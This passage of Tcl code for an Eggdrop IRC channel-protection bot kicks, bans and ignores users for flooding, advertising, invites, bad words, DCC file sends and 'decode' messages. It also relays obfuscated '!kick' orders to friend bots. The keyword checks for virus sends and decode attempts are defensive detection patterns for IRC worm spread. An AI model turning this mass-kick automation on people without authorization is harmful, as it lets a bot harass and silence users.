  if {$totalmin >= 60} { set minsfull [expr $totalmin/60] ; set mins [expr int($minsfull)] }
  if {$totalmin < 60} { set mins 0 }
  if {$years < 1} {set yearstext ""} elseif {$years == 1} {set yearstext "${years}1y"} {set yearstext "${years}1y"}
  if {$days < 1} {set daystext ""} elseif {$days == 1} {set daystext "${days}1d"} {set daystext "${days}1d"}
  if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "${hours}1h"} {set hourstext "${hours}1h"}
  if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "${mins}1m"} {set minstext "${mins}1m"}
  if {[string length $mins] == 1} {set mins "0${mins}"}
  if {[string length $hours] == 1} {set hours "0${hours}"}
  set awayoutput "02${yearstext} 02${daystext} 02${hours}1h 02${mins}1m "
  set awayoutput [string trimright $awayoutput ", "]
  if {[getuser "config" XTRA "ODON"]!=""} { set awban $awaybanner } { set awban }
  if {[getuser "config" XTRA "AWAY"]!=""} { set longer "" 
  } { set awaymsg [lindex $awaym [rand [llength $awaym]]] ; set longer "" }
}
proc notc_prot {nick uhost hand text {dest ""}} {
  global notc botnick notc_chn bannick notm quick ismaskhost is_m
  if {$dest != "" && $dest != $botnick} {
    if {[string index $dest 0] == "+" || [string index $dest 0] == "@"} { foreach x [channels] { set x [string tolower $x] ; if {[string match "*$x*" [string tolower $dest]]} { set dest $x ; break } } } 
    if {[isop $botnick $dest]} {
      if {[string match "*-greet*" [channel info $dest]]} { return 0 }
      if {$nick == "ChanServ" || $nick == $botnick || [matchattr $nick f] || [isop $nick $dest]} { return 0 }
      if {[isutimer "set_-m $dest"]} { return 0 }
      set bannick($nick) "$uhost"
      if {[info exists notc_chn($dest)]} { incr notc_chn($dest) } { set notc_chn($dest) 1 }
      if {$notc_chn($dest) == 1} {
        putsrv "KICK $dest $nick :1abusing 2notice1, @ps only"
        } elseif {$notc_chn($dest) == 2} {
        if {$quick == "1" && ![info exists is_m($dest)]} { putqck "KICK $dest $nick :1twice 2notice1.. abused!" } { putsrv "KICK $dest $nick :1twice 2notice1 abused" }
        } elseif {$notc_chn($dest) >= 3} {
        if {[info exists ismaskhost]} { set bannick($nick) "$uhost" }
        if {$quick == "1" && ![info exists is_m($dest)]} { putqck "KICK $dest $nick :1to much 2violence1 from this I.S.P" } { putsrv "KICK $dest $nick :1to much 2violence1 from this I.S.P" }
      }
      return 0
    }
    repeat_pubm $nick $uhost $hand $dest $text
  } { msg_prot $nick $uhost $hand $text }
}
proc setignore {mask reason time} {
  global quick
  foreach x [ignorelist] { if {[lindex $x 0] == $mask} { return 0 } }
  newignore $mask "IgN" $reason 15
  if {$quick == "1"} { putquick "silence +$mask" } { putserv "silence +$mask" }
  utimer $time [list unsetignore $mask]
}
proc unsetignore {mask} { if {![isignore $mask]} { return 0 } ; putserv "silence -$mask" ; killignore $mask }
set massmsg 0
proc msg_prot {unick uhost hand text} {
  global nick botnick invme nwo nickpass altpass notc notb notd virus_nick ex_flood vern basechan
  global altnick twice_msg version bannick massmsg keep-nick badwords advwords quick is_m ismaskhost
  global querym commandkc msgcoms
  set querymsg [lindex $querym [rand [llength $querym]]]
  regsub -all -- [dezip "jG~BDx04ntxb0"] $text "" text
  msg_Z $unick $uhost $hand $text
  set real $text
  set text [uncolor $text]
  if {$unick == $botnick} { return 0 }
  if {[string match "*dcc send*" [string tolower $text]] && ![string match "*Serv*" $unick] && ![matchattr $unick f]} {
    set virus_file [lindex $text 2] ; set virus_nick $unick
    foreach x [channels] {
      if {[onchan $virus_nick $x] && ![matchattr $virus_nick f]} {
        if {[isop $botnick $x]} {
          set bannick($virus_nick) $uhost
          putsrv "KICK $x $virus_nick :i hate 2$virus_file 1virus"
          } else {
          foreach c [chanlist $x f] { if {[isop $c $x]} { putlog "RePORTED ViRUS FRoM <<$nick$x>> To #$c#" ; set sendspam "!kick [zip "$x $unick i hate 2$virus_file 1virus 2-report by1 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } }
    } } }
    return 0
  }
  if {$unick == "ChanServ"} {
    if {[string match "*You do not have access to op people on*" $text] && [getuser "config" XTRA "MUSTOP"] != "" && $botnick == $nick} {
      set partchn [lindex $text 9] ; set partchn [string range $partchn 0 [expr [string length $partchn]-2]]
      if {[string match "*-secret*" [channel info $partchn]]} { putsrv "PART $partchn :((((@pGuaRd))))" ; channel remove $partchn ; savechan }
    }
    if {[string match "*is not on*" $text]} { 
      set text [string tolower $text]
      foreach x [channels] {
        set x [string tolower $x]
        set cflag "c$x"
        set cflag [string range $cflag 0 8]
        if {[string match "*$x*" $text]} {
          if {![string match "*c*" [getchanmode $x]]} { putsrv "PART $x :1regained (4@1)ps status" } { putsrv "PART $x :regained (@)ps status" }
          if {[matchattr $cflag K]} { puthlp "JOIN $x :[dezip [getuser $cflag XTRA "CI"]]" } { puthlp "JOIN $x" }
      } }
      return 0
    }
    if {[string match "*AOP:*SOP:*AKICK*" $text]} {
      foreach errchan [channels] {
        set cflag "c$errchan"
        set cflag [string range $cflag 0 8]
        if {[string match "*[string tolower $errchan] *" [string tolower $text]]} {
          if {![isop $botnick $errchan]} {
            if {![string match "*c*" [getchanmode $errchan]]} { putsrv "PART $errchan :1regained (4@1)ps status" } { putsrv "PART $errchan :regained (@)ps status" }
            if {[matchattr $cflag K]} { puthlp "JOIN $errchan :[dezip [getuser $cflag XTRA "CI"]]" } { puthlp "JOIN $errchan" }
          }
          return 0
    } } }
    return 0 
  }
  if {$unick == "NickServ"} {
    if {[string match "*nick is owned*" [string tolower $text]] || [string match "*registered and protected*" [string tolower $text]]} {
      putlog "IDeNTIFY"
      catch { clearqueue all }
      if {$botnick == $nick && $nickpass != ""} { putsrv "NickServ identify $nickpass" }
      if {$botnick == $altnick && $altpass != ""} { putsrv "NickServ identify $altpass" }
    }
    if {[string match "*Password accepted for*" $text]} { auto_reop }
    return 0
  }
  if {$unick == "MemoServ"} { if {[string match "*New evochat news is available*" $text]} { putsrv "PRIVMSG MemoServ@services.evochat.id :NEWS" } ; return 0 }
  if {[string match "!kick*" [string tolower $text]]} {
    if {[matchattr $unick f]} {
      set salls [dezip [lrange $text 1 end]] ; putlog "$salls" 
      set schan [lindex $salls 0] ; set snick [lindex $salls 1] ; set sreas [lrange $salls 2 end] 
      if {![isop $botnick $schan] || [matchattr $snick f] || ![onchan $snick $schan]} { return 0 }
      set banhost [getchanhost $snick $schan] ; set bannick($snick) $banhost
      regsub -all -- [dezip "bF~uC0.JqaEc0"] $sreas "" sreas ; regsub -all -- [dezip "xdxs~F1hBM6q0"] $sreas "" sreas
	  set psnban
      putsrv "KICK $schan $snick :$sreas $psnban" ; return 0
      } {
      if {[info exists commandkc($unick)]} {
        set bannick($nick) "$uhost" 
        foreach x [channels] { if {[onchan $unick $x] && [isop $botnick $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :1dont blame me, you've been warned!" } }
        unset commandkc($unick) ; return 0
        } else { foreach x [channels] { if {[onchan $unick $x] && [isop $botnick $x]} { putsrv "KICK $x $unick :1dont you dare 1st warn!" } } 
        set commandkc($unick) 1 ; return 0
  } } }
  if {[string match "*auth*" $text] || [string match "*[string tolower $notb]*" [string tolower $text]]} { return 0 }
  if {[matchattr $hand f]} { putlog "$unick is a friend" ; return 0 }
  set mhost "@[lindex [split $uhost @] 1]"
  if {[string match "*decode*" [string tolower $text]]} {
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :i hate 2decode"
          } {
          foreach c [chanlist $x f] { if {[isop $c $x]} { set sendspam "!kick [zip "$x $unick i hate 2decode 1-report by2 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } }
    } } }
    set invme($mhost) "decode" ; return 0
  }
  if {[string match "*#*" $text] || [string match "*/j*" $text] || [string match "*/s*" $text]} {
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :private 2message 1inviter" 
        } { foreach c [chanlist $x f] { if {[isop $c $x]} { set sendspam "!kick [zip "$x $unick private 2message 1inviter 2-report by1 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } } }
        } {
        set banmask "[string range $uhost [string first "@" $uhost] end]"
        if {$banmask != "*!*@*" && $banmask != "*"} {
          foreach c [chanlist $x] {
            set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
            if {$banmask == $nickhost} {
              if {$c != $botnick} {
                if {[isop $botnick $x]} {
                  if {[matchattr $c f]} { continue }
                  set bannick($c) [getchanhost $c $x]
                  putsrv "KICK $x $c :4!1relay4! 1from 2$unick14(2$uhost14) 1invite"
                  } {
                  foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $c 4!1relay4! 1from 2$unick14(2$uhost14) 1invite 2-report by1 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } }
    } } } } } } }
    set invme($mhost) "invite" ; return 0
  }
  foreach badword [string tolower $badwords] {
    if {[string match *$badword* [string tolower $text]]} {
      foreach x [channels] {
        if {[onchan $unick $x]} {
          if {[isop $botnick $x]} {
            set bannick($unick) "$uhost"
            putsrv "KICK $x $unick :1badwo4rd 2private message 1match from 2$badword"
          } { foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $unick 1badwo4rd 2private message 1match from 2$badword 1-report by2 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } }
  } }
  return 0
  } }
  foreach msgcom [string tolower $msgcoms] {
    if {[string match "$msgcom *" [string tolower [string trimleft [lindex $text 0] "`+-$"]]]} {
      foreach x [channels] {
        if {[onchan $unick $x]} {
          if {[isop $botnick $x]} {
            set bannick($unick) "$uhost"
            putsrv "KICK $x $unick :2command attempting 1match from 2$msgcom"
          } { foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $unick 2command attempting 1match from 2$msgcom 1-report by2 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } }
  } }
  return 0
  } }
  foreach advword [string tolower $advwords] {
    if {[string match *$advword* [string tolower $text]]} {
      if {[string match "*evochat.id*" $text] || [string match "*wwww*" $text] || [string match "*www..*" $text] || [string match "*dns*" $text] || [string match "*ip*" $text] || [string match "*info*" $text]} { return 0 }
      foreach x [channels] {
        if {[onchan $unick $x]} {
          if {[botisop $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :private advertise 2match 1from 2$advword" 
		  } { foreach s [chanlist $x f] { if {[isop $s $x]} { putlog "$unick$s$x" ; set sendspam "!kick [zip "$x $unick private advertise 2match 1from 2$advword 1-report by2 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } }
          } {
          set banmask "[string range $uhost [string first "@" $uhost] end]"
          if {$banmask != "*!*@*" && $banmask != "*"} {
            foreach c [chanlist $x] {
              set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
              if {$banmask == $nickhost} {
                if {[matchattr $c f]} { continue }
                if {$c != $botnick} {
                  if {[isop $botnick $x]} { set bannick($c) "[getchanhost $c $x]" ; putsrv "KICK $x $c :4!1relay4!1 private 2advertise 1from 2$unick14(2$uhost14) 1match 2$advword"
                    } {
                    foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $c 4!1relay4!1 private 2advertise 1from 2$unick14(2$uhost14) 1match 2$advword 1-report by2 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } }
      } } } } } } }
      set invme($mhost) "advertise" ; return 0
      } }
	if {![isutimer "MSGCOUNTER"]} { utimer 20 { putlog "MSGCOUNTER" } ; set massmsg 1
    } {
    set massmsg [incr massmsg]
    if {[string length $text] > 74} { set massmsg [incr massmsg] }
    if {$massmsg >= 4} {
      puthlp "PRIVMSG $basechan :\001aCTION Incoming Mass Msg..! LasT FRoM 1[unsix "$unick!$uhost"]\001" 
      set massmsg 0 ; setignore "*!*@*" "*" 60
      if {[info exists ismaskhost]} { setignore [maskhost "*!*$mhost"] "MaZz MSg" 120 } { setignore "*!*$mhost" "MaZz MSg" 120 }
      foreach x [channels] {
        if {[onchan $unick $x]} {
          if {[isop $botnick $x]} { if {![matchattr $unick f] || $unick == $botnick} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :1flood2 msg 2from 2$mhost" }
         } { foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $unick 1flood2 msg 2from 2$mhost 1-report by2 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } }
        } }
	  return 0
    } }
  if {[string length $text] > 100} {
  set chr 0 ; set cnt 0
  while {$cnt < [string length $real]} { if [isflood [string index $real $cnt]] { incr chr } ; incr cnt }
  if {$chr > 30} {
    setignore "*!*@*" "*" 60
    puthlp "PRIVMSG $basechan :\001ACTION IncOmINg TsunamI MSg..! FRoM 1[unsix "$unick!$uhost"]\001"
    if {[info exists ismaskhost]} { setignore [maskhost "*!*$mhost"] "TsunamI MSg" 120 } { setignore "*!*$mhost" "TsunamI MSg" 120 }
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :4!1tsunami4!1 msg from 2[string trimleft $uhost "~"]" 
        } { 
		foreach s [chanlist $x f] { 
		if {[isop $s $x]} {
		 set sendspam "!kick [zip "$x $unick 4!1tsunami4!1 msg from 2[string trimleft $uhost "~"] 1-report by2 $botnick-"]"
		 putlog "msg $s in $x"
		 putsrv "PRIVMSG $s :$sendspam" } 
		} } } } 
	  return 0
  } }
  if {[string length $text] > 200} {
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :1private 2msg flood 1protection"
        } { foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $unick 1private 2msg flood 1protection 2-report by1 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } }
      } }
    if {![isutimer "LONGTEXT"]} { utimer 30 { putlog "LONGTEXT" } ; setignore "*!*@*" "*" 60
      puthlp "PRIVMSG $basechan :\001ACTION IncOmINg LoNg TexT MSg..! FRoM 1[unsix "$unick!$uhost"]\001"
      if {[info exists ismaskhost]} { setignore [maskhost "*!*$mhost"] "LoNg TexT MSg" 120 } { setignore "*!*$mhost" "LoNg TexT MSg" 120 }
    } }
  if {$unick != $nwo} {
    if {[info exists twice_msg($unick)]} {
      set hostmask "${unick}!*@*" ; puthlp "PRIVMSG $unick :$querymsg" ; putlog "IgNORE <<$hostmask>> PV-msg"
      unset twice_msg($unick) ; newignore $hostmask $unick "*" 2
      } {
      if {[istimer "chkautomsg"]} { set invme($mhost) "autojoin msg" ; putlog "set invme $unick $invme($mhost)" ; return 0 }
      if {[isutimer "NO REPLY"]} { foreach x [utimers] { if {[string match "*NO REPLY*" $x]} { killutimer [lindex $x 2] } } ; utimer 10 { putlog "NO REPLY" } ; return 0 }
      utimer 10 { putlog "NO REPLY" }
      if {[string match "*evochat.id*" $uhost]} { puthlp "PRIVMSG $unick :$querymsg" } { if {[getuser "config" XTRA "AWAY"]!=""} { puthlp "PRIVMSG $unick :$querymsg" } { puthlp "PRIVMSG $unick :$querymsg" } ; set twice_msg($unick) 1 }
    } } }
proc auto_reop {} {
  global notc botnick
  foreach x [channels] {
    if {[onchan $botnick $x] && ![isop $botnick $x] && ![string match "*+protectfriends*" [channel info $x]]} {
          set cret 30
          foreach ct [utimers] { if {[string match "*chancnt*" $ct]} { if {[expr [lindex $ct 0] + 30] > $cret} { set cret [expr [lindex $ct 0] + 30] } } }
          utimer $cret [list chancnt $x]
  } }
  return 0
}
proc chancnt {chan} { if {[isutimer "chancnt $chan"]} { return 0 } ; putsrv "ChanServ count $chan" }
set kickcounter "scripts/kicks.dat"
bind kick - * prot:kick
proc prot:kick {nick uhost handle chan knick reason} {
  global notc notd botnick squ kickme notb notm bannick igflood botname quick is_m op_it is_ban iskick kickcounter
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string match "* *" $reason] || [string match "*$notm*" $reason]} { set igflood($nick) "1" }
  if {[info exists iskick($knick$chan)]} { unset iskick($knick$chan) }
  if {$nick == $botnick} {
    if {![file exists $kickcounter]} { set file [open $kickcounter w] ; puts $file 1 ; catch {close $file} }
    set file [open $kickcounter r] ; set currentkicks [gets $file] ; catch {close $file} ; set file [open $kickcounter w] 
    puts $file [expr $currentkicks + 1] ; catch {close $file}
    if {[info exists kickme($knick)]} { if {$kickme($knick) == 1} { set kickme($knick) 2 } ; if {$kickme($knick) == 3} { catch { unset kickme($knick) } } }
    if {[string match "*$notm*" $reason]} {
      if {![info exists bannick($knick)]} { return 0 }
      if {[info exists is_ban($bannick($knick)$chan)]} { return 0 }
      set is_ban($bannick($knick)$chan) 1
      if {$bannick($knick) == "*!*@*"} { return 0 }
      set cmode [getchanmode $chan]
      set ok_m "1"
      if {[info exists is_m($chan)]} { set ok_m "0" }
      if {[isutimer "set_-m $chan"]} { set ok_m "0" }
      if {[string match "*m*" $cmode]} { set ok_m "0" }
      if {$ok_m == "1"} { 
        set is_m($chan) 1
        if {$quick == "1"} { putquick "mode $chan +b *[string trimleft $bannick($knick) ~]" ; unset bannick } { putserv "mode $chan +b *[string trimleft $bannick($knick) ~]" }
      } { if {$quick == "1"} { putquick "mode $chan +b *[string trimleft $bannick($knick) ~]" ; unset bannick } { putserv "mode $chan +b *[string trimleft $bannick($knick) ~]" } }
      return 0
      } {
      if {![info exists bannick($knick)]} { return 0 }
      if {$bannick($knick) == "*!*@*"} { return 0 }
      putserv "mode $chan +b *[string trimleft $bannick($knick) ~]"
    }
    return 0
  }
  if {$nick == $knick} { return 0 }
  if {$nick == "ChanServ"} { return 0 }
  if {[matchattr $nick f]} { return 0 }
  if {$knick == $botnick} {
    if {[info exists kickme($nick)]} { set kickme($nick) 3 ; putsrv "chanserv deop $chan $nick" } { if {[matchattr $cflag D]} { set kickme($nick) 1 } }
    puthlp "JOIN $chan"
    return 0
  }
  if {![isop $botnick $chan]} { return 0 }
  if {$knick == $notb} { putserv "KICK $chan $nick :1dont kick 2$notb" ; set op_it($knick) 1 ; return 0 }
  if {$knick == $squ} { putserv "KICK $chan $nick :1dont kick 2$squ" ; set op_it($knick) 1 ; return 0 }
  if {[matchattr $knick n]} { putsrv "KICK $chan $nick :1admin 2kick1 protection" ; set op_it($knick) 1 ; return 0 }
  if {[matchattr $knick m]} { putsrv "KICK $chan $nick :1master 2kick1 protection " ; set op_it($knick) 1 ; return 0 }
}
proc unbanq {chan host} { global botnick ; if {[isop $botnick $chan]} { puthelp "mode $chan -kb 6auto.unban $host" } }
set banidx 1
proc banmsg {} {
  global banidx bancounter kickcounter
  set banidx [incr banidx]
  set counter [open $kickcounter r]; set currentkicks [gets $counter]; catch {close $counter}; set kicks [expr $currentkicks]
  if {$banidx >= [llength $bancounter]} { set banidx 1 }
  set banmsg [lindex $bancounter $banidx]
  append banmsg ") (.5$kicks."
  return $banmsg
}
set kickidx 1
proc kickmsg {} {
  global kickms kickidx
  set kickidx [incr kickidx]
  if {$kickidx >= [llength $kickms]} { set kickidx 1 }
  set kickmsg [lindex $kickms $kickidx]
  return $kickmsg
}
proc ban_chk {nick uhost handle channel mchange bhost} {
  global botnick botname squ quick notb notc bannick ban-time igflood invme ex_flood
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  set mhost "@[lindex [split $uhost @] 1]"
  if {[info exists invme($mhost)]} { catch { unset invme($mhost) } }
  if {![isop $botnick $channel]} { return 0 }
  set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
  if {$banmask == "*!*@*"} { set banmask "$nick!*@*" }
  if {$bhost == "*!*@*"} { utimer [rand 4] [list unbanq $channel $bhost] ; return 1 }
  set cmode [getchanmode $channel]
  if {[getuser "config" XTRA "IPG"] != ""} {
    foreach ipg [getuser "config" XTRA "IPG"] {
      if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
        if {![isutimer "IPG $bhost"]} { if {![string match "*k*" $cmode]} { puthelp "mode $channel -kb 1ip.gu4a1rd $bhost" } { puthelp "mode $channel -b $bhost" } ; utimer 60 [list putlog "IPG $bhost"] }
        return 1
  } } }
  if {[string match [string tolower $bhost] [string tolower $botname]]} {
    if {![matchattr $nick f] && $nick != $botnick && $nick != "ChanServ" && ![string match "*evochat.id*" $nick] && ![info exists igflood($nick)]} {
      if {[matchattr $cflag D]} { if {$quick == "1"} { putqck "KICK $channel $nick :1self 2banning1 defense reversing" } { putsrv "KICK $channel $nick :1self 2banning1 defense reversing" } }
      if {![string match "*k*" $cmode]} { if {$quick == "1"} { putquick "mode $channel -bk+b $bhost 6defense.ban.reversing $banmask" } { putserv "mode $channel -bk+b $bhost 6defense.ban.reversing $banmask" } } { if {$quick == "1"} { putquick "mode $channel -b+b $bhost $banmask" } { putserv "mode $channel -b+b $bhost $banmask" } }
    } { if {![string match "*k*" $cmode]} { if {$quick == "1"} { putquick "mode $channel -kb 6self.unban $bhost" } else { putserv "mode $channel -kb 6self.unban $bhost" } } { if {$quick == "1"} { putquick "mode $channel -b $bhost" } else { putserv "mode $channel -b $bhost" } } }
    return 1
  }
  foreach knick [chanlist $channel] {
    if {[string match [string tolower $bhost] [string tolower $knick![getchanhost $knick $channel]]]} {
      if {[matchattr $knick f]} {
        if {$knick != $squ && $knick != $notb} { utimer 1 [list unbanq $channel $bhost] }
        if {[matchattr $nick f] || $nick == $botnick || $nick == "ChanServ" || [string match "*evochat.id*" $nick] || [info exists igflood($nick)]} { return 1 }
      }
      if {$knick == $notb} {
        if {$nick != $botnick} {
          putserv "KICK $channel $nick :1dont banned 2$notb"
          if {![string match "*k*" $cmode]} { putserv "mode $channel -kb 6$notb.guard $bhost" } { putserv "mode $channel -b $bhost" } 
        } { if {![string match "*k*" $cmode]} { putserv "mode $channel -kb 6auto.unban $bhost" } { putserv "mode $channel -b $bhost" } }
        return 1
      }
      if {$knick == $squ} {
        if {$nick != $botnick} {
          putserv "KICK $channel $nick :1dont banned 2$squ"
          if {![string match "*k*" $cmode]} { putserv "mode $channel -kb 6$squ.guard $bhost" } { putserv "mode $channel -b $bhost" }
          } {
          if {![string match "*k*" $cmode]} { putserv "mode $channel -kb 6auto.unban $bhost" } { putserv "mode $channel -b $bhost" }
        }
        return 1
      }
      if {[matchattr $knick n]} { if {$nick != $botnick} { set bannick($nick) $banmask ; putserv "KICK $channel $nick :1dont banned my admin 2$knick" } ; return 1 }
      if {[matchattr $knick m]} { if {$nick != $botnick} { putserv "KICK $channel $nick :1dont banned my master 2$knick" } ; return 1 }
      if {[matchattr $cflag E]} {
        if {$nick == $botnick} {
          set menforce [rand 4]
          if {$menforce == 1} { putsrv "KICK $channel $knick :1Banned"
            } elseif {$menforce == 2} { putsrv "KICK $channel $knick :1Banned"
            } elseif {$menforce == 3} { putsrv "KICK $channel $knick :1Banned"
          } else { putsrv "KICK $channel $knick :1Banned" }
          } else {
          if {[matchattr $nick n]} { putsrv "KICK $channel $knick :1Banned"
            } else {
            if {[matchattr $nick m]} {
              putsrv "KICK $channel $knick :1Banned"
              } else {
              if {[isop $knick $channel] && ![matchattr $nick f]} { return 1 }
              if {![matchattr $knick f]} {
                set menforce [rand 5]
                if {$menforce == 1} { putsrv "KICK $channel $knick :1Banned"
                  } elseif {$menforce == 2} { putsrv "KICK $channel $knick :1Banned"
                  } elseif {$menforce == 3} { putsrv "KICK $channel $knick :1Banned"
                  } elseif {$menforce == 4} { putsrv "KICK $channel $knick :1Banned"
                } else { putsrv "KICK $channel $knick :1Banned" }
  } } } } } } }
  return 0
}
bind mode - * prot:deop
proc prot:deop {nick uhost handle channel mchange {opnick ""}} {
  global botnick deopme squ invme virus_nick quick notb notc bannick lastkey unop igflood is_m op_it
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  set mode [lindex $mchange 0]
  if {$opnick == ""} { set opnick [lindex $mchange 1] }
  if {$mode == "-m"} {
    foreach x [utimers] { if {[string match "*set_-m $channel*" $x] || [string match "*TRAFFIC $channel*" $x]} { killutimer [lindex $x 2] } }
    catch {unset is_m($channel)}
    if {![botisop $channel]} { return 0 }
    if {[matchattr $cflag V]} {
      foreach x [chanlist $channel] {
        if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
          set cret [getuser $cflag XTRA "VC"]
          foreach ct [utimers] { if {[string match "*voiceq*" $ct]} { if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} { set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] } } }
          utimer $cret [list voiceq $channel $x]
    } } }
    return 0
  }
  if {$mode == "+k"} { set lastkey $opnick ; if {[matchattr $cflag K] && [matchattr $nick Z]} { putlog "key change to $opnick" ; setuser $cflag XTRA "CI" [zip $opnick] ; saveuser } }
  if {$mode == "-k"} { catch { unset lastkey } ; if {$nick != $botnick} { set igflood($nick) "1" } ; return 0 }
  if {$mode == "+m"} {
    foreach x [utimers] { if {[string match "*set_-m $channel*" $x] || [string match "*voiceq $channel*" $x] || [isutimer "advq $channel"]} { killutimer [lindex $x 2] } }
    if {$nick == $botnick} {
      if {![string match "*m*" [lindex [channel info $channel] 0]]} {
        if {[string match "*+shared*" [channel info $channel]]} { puthelp "NOTICE $channel :WaRnInG!! onE MInUtE MoDeRaTe DuE to FLood..!" }
        utimer 70 [list set_-m $channel]
        if {[isutimer "TRAFFIC $channel"]} { utimer 20 [list pub_nobot "*" "*" "*" $channel "*"] ; return 0 }
      }
      } {
      if {[isutimer "goback"]} {
        catch { clearqueue all }
        foreach x [utimers] { if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] } ; if {[string match "*goback*" $x]} { killutimer [lindex $x 2] ; goback } }
        utimer 2 del_nobase ; return 0
      }
      utimer [expr 1800 + [rand 60]] [list set_-m $channel]
    }
    return 0
  }
  if {$mode == "+b"} {
    if {$opnick == "*!*@heavy.join.flood.channel.temporary.moderate"} {
      utimer 40 [list putlog "TRAFFIC Join $channel"]
      if {$nick == $botnick} {
        utimer 60 [list putserv "mode $channel -bmR *!*@heavy.join.flood.channel.temporary.moderate"]
        if {[info exists is_m($channel)]} { return 0 }
        if {$quick == "1"} { putquick "mode $channel +m" } { putserv "mode $channel +m" }
        set is_m($channel) 1
        return 0
      }
    }
    if {$opnick == "*!*@heavy.flood.channel.temporary.moderate"} {
      utimer 40 [list putlog "TRAFFIC Part $channel"]
      if {$nick == $botnick} {
        utimer 120 [list putserv "mode $channel -bmR *!*@heavy.flood.channel.temporary.moderate"]
        return 0
      }
    }
    ban_chk $nick $uhost $handle $channel $mchange $opnick
    return 0
  }
  if {$mode == "-b"} {
    if {[info exists is_ban($opnick$channel)]} { catch {unset is_ban($opnick$channel)} }
    if {[isutimer "unbanq $channel $opnick"]} { foreach x [utimers] { if {[string match "*unbanq $channel $opnick*" $x]} { killutimer [lindex $x 2] } } }
    foreach x [ignorelist] { if {[lindex $x 0] == $opnick} { unsetignore [lindex $x 0] ; return 0 } } 
    catch { killban $opnick }
    return 0
  }
  if {$mode == "+o"} {
    if {$nick == $opnick} { return 0 }
    if {$opnick == $botnick} {
      if {[isutimer "checkonop$channel"]} { return 0 }
      utimer 15 [list putlog "checkonop$channel"]
      chk_on_op $channel 
      return 0 
      } {
      if {[info exists op_it($opnick)]} { catch {unset op_it($opnick)} }
      if {![isop $botnick $channel]} {return 0}
      if {[matchattr $opnick O]} { if {![string match "*k*" [getchanmode $channel]]} { puthelp "mode $channel -ko 6no@p.list $opnick" } { puthelp "mode $channel -o $opnick" } ; return 0 }
      if {[info exists unop($opnick)]} {
        if {$nick == "ChanServ"} { catch { unset unop($opnick) } ; return 0 }
        if {[matchattr $opnick f] || [matchattr $nick f] || $nick == $botnick} { return 0 }
        utimer [expr 1 + [rand 5]] [list unallowed $channel $nick $opnick]
      return 0
  } } }
  if {$mode == "-o"} {
    foreach x [utimers] { if {[string match "*unallowed $channel $opnick*" $x]} { killutimer [lindex $x 2] } }
    if {$opnick == $botnick && $nick != $botnick} {
      if {[isutimer "DEOP $channel"]} { return 0 }
      foreach x [utimers] { if {[string match "*gop $channel*" $x]} { killutimer [lindex $x 2] } }
      utimer 2 [list putlog "DEOP $channel"]
      if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*evochat.id*" $nick] && ![string match "*Guest*" $botnick]} { if {![info exists igflood($nick)]} { if {[matchattr $cflag D]} { set deopme $nick } } }
      if {![matchattr $nick m]} { if {![string match "*+protectfriends*" [channel info $channel]]} { putlog "CHANOP <<$channel>>" ; putsrv "ChanServ op $channel $botnick" } }
      return 0
    }
    if {![isop $botnick $channel]} { return 0 }
    if {[isutimer "deopprc*$opnick"]} { foreach x [utimers] { if {[string match "*deopprc*$opnick*" $x]} { putlog "!UnDeOp OR UnKIcK in $channel!" ; catch { killutimer [lindex $x 2] } } } }
    if {$nick == "ChanServ" && [matchattr $opnick o]} { voiceq $channel $opnick ; return 0 }
    if {$nick == "ChanServ"} { set unop($opnick) "1" ; return 0 }
    if {[matchattr $nick f] || $nick == $botnick} { return 0 }
    if {$opnick == $squ} { if {![info exists igflood($nick)]} { putserv "KICK $channel $nick :1dont de@p 2$squ" } ; opq $channel $opnick ; return 0 }
    if {[matchattr $opnick n]} { if {![info exists igflood($nick)]} { putsrv "KICK $channel $nick :1admin 2de@p1 guard" ; opq $channel $opnick } ; return 0 }
    if {[matchattr $opnick m]} { if {![info exists igflood($nick)]} { putsrv "KICK $channel $nick :1master 2de@p1 guard" ; opq $channel $opnick } ; return 0 }
    if {[matchattr $opnick o]} { opq $channel $opnick ; return 0 }
